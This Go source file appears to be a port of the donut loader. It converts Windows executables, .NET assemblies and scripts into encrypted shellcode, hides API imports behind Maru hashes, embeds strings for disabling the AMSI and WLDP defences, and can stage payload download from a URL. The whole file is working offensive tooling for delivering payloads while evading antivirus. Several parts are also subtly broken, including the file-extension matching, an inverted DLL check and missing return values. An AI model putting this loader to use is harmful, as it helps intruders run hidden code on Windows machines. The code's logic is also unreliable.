package donut

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"path/filepath"
	"strings"
	"unicode/utf16"
)

/*
	This code imports PE files and converts them to shellcode using the algorithm and stubs taken
	from the donut loader: https://github.com/TheWover/donut

	You can also use the native-code donut tools to do this conversion.

	This has the donut stubs hard-coded as arrays, so if something rots,
	try updating the stubs to latest donut first.
*/

// ShellcodeFromURL - Downloads a PE from URL, makes shellcode
func ShellcodeFromURL(fileURL string, config *DonutConfig) (*bytes.Buffer, error) {
	buf, err := DownloadFile(fileURL)
	if err != nil {
		return nil, err
	}
	// todo: set things up in config
	return ShellcodeFromBytes(buf, config)
}

// ShellcodeFromFile - Loads PE from file, makes shellcode
func ShellcodeFromFile(filename string, config *DonutConfig) (*bytes.Buffer, error) {

	b, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	switch strings.ToLower(filepath.Ext(filename)) {
	case "exe":
		config.Type = DONUT_MODULE_EXE
		// todo: how to tell .NET or not?
	case "dll":
		config.Type = DONUT_MODULE_EXE
		// todo: how to tell .NET or not?
	case "xsl":
		config.Type = DONUT_MODULE_XSL
	case "js":
		config.Type = DONUT_MODULE_JS
	case "vbs":
		config.Type = DONUT_MODULE_VBS
	}
	return ShellcodeFromBytes(bytes.NewBuffer(b), config)
}

// ShellcodeFromBytes - Passed a PE as byte array, makes shellcode
func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, error) {

	if err := CreateModule(config, buf); err != nil {
		return nil, err
	}
	instance, err := CreateInstance(config)
	if err != nil {
		return nil, err
	}
	// todo: all of this is a bit coupled
	return instance, nil
}

// Sandwich - adds the donut prefix in the beginning (stomps DOS header), then payload, then donut stub at the end
func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
	/*
			Disassembly:
					   0:  e8 					call $+
					   1:  xx xx xx xx			instance length
					   5:  [instance]
		 x=5+instanceLen:  0x59					pop ecx
		             x+1:  stub preamble + stub (either 32 or 64 bit or both)
	*/

	buf := bytes.NewBuffer([]byte{})
	w := bufio.NewWriter(buf)
	byteOrder := binary.LittleEndian // Windows is always Little Endian
	instanceLen := uint32(payload.Len())

	binary.Write(w, byteOrder, 0xE8)
	binary.Write(w, byteOrder, instanceLen)
	binary.Write(w, byteOrder, payload.Bytes())
	binary.Write(w, byteOrder, 0x59)

	switch arch {
	case X32:
		binary.Write(w, byteOrder, []byte{0x5A, 0x51, 0x52}) // preamble: pop edx, push ecx, push edx
		binary.Write(w, byteOrder, PayloadEXEx32)
	case X64:
		binary.Write(w, byteOrder, PayloadEXEx64)
	case X84:
		binary.Write(w, byteOrder, []byte{0x31, 0xC0, // preamble: xor eax,eax
			0x48,        // dec ecx
			0x0F, 0x88}) // js dword x86_code (skips length of x64 code)
		binary.Write(w, byteOrder, uint32(len(PayloadEXEx64)))
		binary.Write(w, byteOrder, PayloadEXEx64)
		binary.Write(w, byteOrder, []byte{0x5A, // in between 32/64 stubs: pop edx
			0x51,  // push ecx
			0x52}) // push edx
		binary.Write(w, byteOrder, PayloadEXEx32)
	}
	w.Flush()
	return buf, nil
}

// CreateModule - Creates the Donut Module from Config
func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {

	mod := new(DonutModule)

	if config.Type == DONUT_MODULE_NET_DLL ||
		config.Type == DONUT_MODULE_NET_EXE {
		if config.Domain == "" { // If no domain name specified, generate a random one
			d := RandomString(DONUT_DOMAIN_LEN)
			wstr := utf16.Encode([]rune(d))
			for i, r := range wstr {
				mod.Domain[i] = r
			}
			if config.Type == DONUT_MODULE_NET_DLL {
				log.Println("Class:", config.Class)
				wstr = utf16.Encode([]rune(config.Class))
				for i, r := range wstr {
					mod.Cls[i] = r
				}
				log.Println("Method:", config.Method)
				wstr = utf16.Encode([]rune(config.Method))
				b := bytes.NewBuffer([]byte{})
				for _, r := range wstr {
					binary.Write(b, binary.LittleEndian, r)
				}
				copy(mod.Method[:], b.Bytes())
			}
			// If no runtime specified in configuration, use version from assembly (todo)
			if config.Runtime == "" {
				//strncpy(c.runtime, fi.ver, DONUT_MAX_NAME-1);
				config.Runtime = "TODO"
			}
			log.Println("Runtime:", config.Runtime)
			wstr = utf16.Encode([]rune(config.Runtime))
			for i, r := range wstr {
				mod.Runtime[i] = r
			}
		}
	} else if config.Type == DONUT_MODULE_DLL && config.Method == "" { // Unmanaged DLL? check for exported api
		log.Println("DLL function:", config.Method)
		copy(mod.Method[:], []byte(config.Method))
	}

	if config.Parameters != "" {
		params := strings.FieldsFunc(config.Parameters, func(r rune) bool { return r == ',' || r == ';' })
		for i, p := range params {
			if i >= DONUT_MAX_PARAM {
				return fmt.Errorf("Parameter Index(%v) exceeds DONUT_MAX_PARAM(%v)", i, DONUT_MAX_PARAM)
			} else if len(p) >= DONUT_MAX_NAME {
				return fmt.Errorf("Parameter: %s exceeds DONUT_MAX_NAME(%v)", p, DONUT_MAX_PARAM)
			}
			log.Println("Adding parameter:", p)
			wstr := utf16.Encode([]rune(p))
			for j, r := range wstr {
				mod.Param[i][j] = r
			}
			mod.ParamCount = uint32(i)
		}
	}
	// read module into memory
	config.ModuleData = inputFile

	// update configuration with pointer to module
	config.Module = mod
	return nil
}

// CreateInstance - Creates the Donut Instance from Config
func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {

	inst := new(DonutInstance)

	log.Println("Entering")
	instLen := uint32(binary.Size(inst))
	// if this is a PIC instance, add the size of module
	// that will be appended to the end of structure
	if config.InstType == DONUT_INSTANCE_PIC {
		log.Printf("The size of module is %v bytes. Adding to size of instance.\n", config.ModuleData.Len())
		instLen += uint32(config.ModuleData.Len())
	}

	if !config.NoCrypto {
		log.Println("Generating random key for instance")
		tk, err := GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.Key.Mk[:], tk)
		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.Key.Ctr[:], tk)
		log.Println("Generating random key for module")
		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.mod_key.Mk[:], tk)
		tk, err = GenerateRandomBytes(16)
		if err != nil {
			return nil, err
		}
		copy(inst.mod_key.Ctr[:], tk)
		log.Println("Generating random string to verify decryption")
		sbsig := RandomString(DONUT_SIG_LEN)
		copy(inst.sig[:], []byte(sbsig))
	}
	log.Println("Generating random IV for Maru hash")
	iv, err := GenerateRandomBytes(MARU_IV_LEN)
	if err != nil {
		return nil, err
	}
	copy(inst.Iv[:], []byte(iv))
	log.Println("Generating hashes for API using IV:", inst.Iv)

	for cnt, c := range api_imports {
		// calculate hash for DLL string
		dllHash := Maru([]byte(c.Module), inst.Iv[:])

		// calculate hash for API string.
		// xor with DLL hash and store in instance
		inst.Hash[cnt] = Maru([]byte(c.Name), inst.Iv[:]) ^ dllHash

		log.Printf("Hash for %s : %s = %v\n",
			c.Module,
			c.Name,
			inst.Hash[cnt])
	}
	// save how many API to resolve
	inst.ApiCount = uint32(len(api_imports))
	inst.DllCount = 0
	copy(inst.DllName[inst.DllCount][:], []byte("ole32.dll"))
	inst.DllCount++
	copy(inst.DllName[inst.DllCount][:], []byte("oleaut32.dll"))
	inst.DllCount++
	copy(inst.DllName[inst.DllCount][:], []byte("wininet.dll"))
	inst.DllCount++
	copy(inst.DllName[inst.DllCount][:], []byte("mscoree.dll"))
	inst.DllCount++

	// if module is .NET assembly
	if config.Type == DONUT_MODULE_NET_DLL ||
		config.Type == DONUT_MODULE_NET_EXE {
		log.Println("Copying GUID structures and DLL strings for loading .NET assemblies")

		copy(inst.xIID_AppDomain[:], xIID_AppDomain[:])
		copy(inst.xIID_ICLRMetaHost[:], xIID_ICLRMetaHost[:])
		copy(inst.xCLSID_CLRMetaHost[:], xCLSID_CLRMetaHost[:])
		copy(inst.xIID_ICLRRuntimeInfo[:], xIID_ICLRRuntimeInfo[:])
		copy(inst.xIID_ICorRuntimeHost[:], xIID_ICorRuntimeHost[:])
		copy(inst.xCLSID_CorRuntimeHost[:], xCLSID_CorRuntimeHost[:])
	} else if config.Type == DONUT_MODULE_VBS ||
		config.Type == DONUT_MODULE_JS {
		log.Println("Copying GUID structures and DLL strings for loading VBS/JS")

		copy(inst.xIID_IUnknown[:], xIID_IUnknown[:])
		copy(inst.xIID_IDispatch[:], xIID_IDispatch[:])
		copy(inst.xIID_IHost[:], xIID_IHost[:])
		copy(inst.xIID_IActiveScript[:], xIID_IActiveScript[:])
		copy(inst.xIID_IActiveScriptSite[:], xIID_IActiveScriptSite[:])
		copy(inst.xIID_IActiveScriptSiteWindow[:], xIID_IActiveScriptSiteWindow[:])
		copy(inst.xIID_IActiveScriptParse32[:], xIID_IActiveScriptParse32[:])
		copy(inst.xIID_IActiveScriptParse64[:], xIID_IActiveScriptParse64[:])

		wstr := utf16.Encode([]rune("WScript"))
		for j, r := range wstr {
			inst.wscript[j] = r
		}
		wstr = utf16.Encode([]rune("wscript.exe"))
		for j, r := range wstr {
			inst.wscript_exe[j] = r
		}

		if config.Type == DONUT_MODULE_VBS {
			copy(inst.xCLSID_ScriptLanguage[:], xCLSID_VBScript[:])
		} else {
			copy(inst.xCLSID_ScriptLanguage[:], xCLSID_JScript[:])
		}
	} else if config.Type == DONUT_MODULE_XSL {
		log.Println("Copying GUID structures for loading XSL to instance")
		copy(inst.xCLSID_DOMDocument30[:], xCLSID_DOMDocument30[:])
		copy(inst.xIID_IXMLDOMDocument[:], xIID_IXMLDOMDocument[:])
		copy(inst.xIID_IXMLDOMNode[:], xIID_IXMLDOMNode[:])
	}
	// required to disable AMSI
	copy(inst.s[:], "AMSI")
	copy(inst.amsiInit[:], "AmsiInitialize")
	copy(inst.amsiScanBuf[:], "AmsiScanBuffer")
	copy(inst.amsiScanStr[:], "AmsiScanString")

	copy(inst.clr[:], "CLR")

	// required to disable WLDP
	copy(inst.wldp[:], "WLDP")
	copy(inst.wldpQuery[:], "WldpQueryDynamicCodeTrust")
	copy(inst.wldpIsApproved[:], "WldpIsClassInApprovedList")

	// set the type of instance we're creating
	inst.Type = uint32(int(config.InstType))

	// if the module will be downloaded
	// set the URL parameter and request verb
	if inst.Type == DONUT_INSTANCE_URL {
		// generate a random name for module
		// that will be saved to disk
		config.ModuleName = RandomString(DONUT_MAX_MODNAME)
		log.Println("Generated random name for module :", config.ModuleName)
		log.Println("Setting URL parameters")
		// append module name
		copy(inst.Url[:], config.URL+config.ModuleName)

		// set the request verb
		copy(inst.Req[:], "GET")
		log.Println("Payload will attempt download from:", inst.Url)
	}

	inst.mod_len = uint64(config.ModuleData.Len())
	inst.Len = instLen
	config.inst = inst
	config.instLen = instLen

	if !config.NoCrypto {
		if config.InstType == DONUT_INSTANCE_URL {
			log.Println("encrypting module for download")
			config.ModuleMac = Maru(inst.sig[:], inst.Iv[:])
			config.ModuleData = bytes.NewBuffer(Encrypt( //todo: make encrypt work on buffers
				inst.mod_key.Mk[:],
				inst.mod_key.Ctr[:],
				config.ModuleData.Bytes(),
				uint32(config.ModuleData.Len())))
		} else { //if config.InstType == DONUT_INSTANCE_PIC
			log.Println("encrypting instance")
			inst.mac = Maru(inst.sig[:], inst.Iv[:])

			b := new(bytes.Buffer)
			if err := binary.Write(b, binary.LittleEndian, *inst); err != nil {
				log.Fatal(err)
			}
			if _, err := config.ModuleData.WriteTo(b); err != nil {
				log.Fatal(err)
			}
			instData := b.Bytes()

			offset := 4 + // Len uint32
				CipherKeyLen + CipherBlockLen + // Instance Crypt
				8 + // IV
				64 // Hash

			encInstData := Encrypt(
				inst.Key.Mk[:],
				inst.Key.Ctr[:],
				instData[offset:],
				uint32(len(instData))-offset)
			var bc bytes.Buffer
			binary.Write(&bc, binary.LittleEndian, instData[:offset])
			binary.Write(&bc, binary.LittleEndian, encInstData)
			log.Println("Leaving.")
			return &bc, nil
		}
	}

	return nil, nil
}
